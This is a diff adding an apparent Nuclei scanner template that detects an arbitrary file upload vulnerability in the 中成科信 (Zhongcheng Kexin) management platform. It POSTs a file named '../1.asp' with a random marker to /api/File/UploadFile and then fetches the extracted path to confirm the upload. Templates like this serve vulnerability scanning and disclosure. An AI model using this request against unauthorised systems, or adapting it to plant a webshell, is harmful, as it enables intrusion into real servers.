@@ -1,0 +1,47 @@
+id: zhongchengkexin-UploadFile-upload
+
+info:
+  name: 中成科信综合管理平台 UploadFile 存在任意文件上传漏洞
+  author: zhongchengkexin
+  severity: high
+  tags: zhongchengkexin
+
+http:
+  - raw:
+      - |
+        POST /api/File/UploadFile HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary1SYBNnJoVIXXChBZ
+
+        ------WebKitFormBoundary1SYBNnJoVIXXChBZ
+        Content-Disposition: form-data; name="file"; filename="../1.asp"
+        
+        {{randstr}}
+        ------WebKitFormBoundary1SYBNnJoVIXXChBZ--
+
+      - |+
+        GET {{paths}} HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Encoding: gzip, deflate
+
+    extractors:
+      - type: regex
+        part: body
+        name: paths
+        regex:
+          - '\.\.(.*?\.asp)"'
+        internal: true
+        group: 1
+
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body_2
+        words:
+          - '{{randstr}}'
+    matchers-condition: and
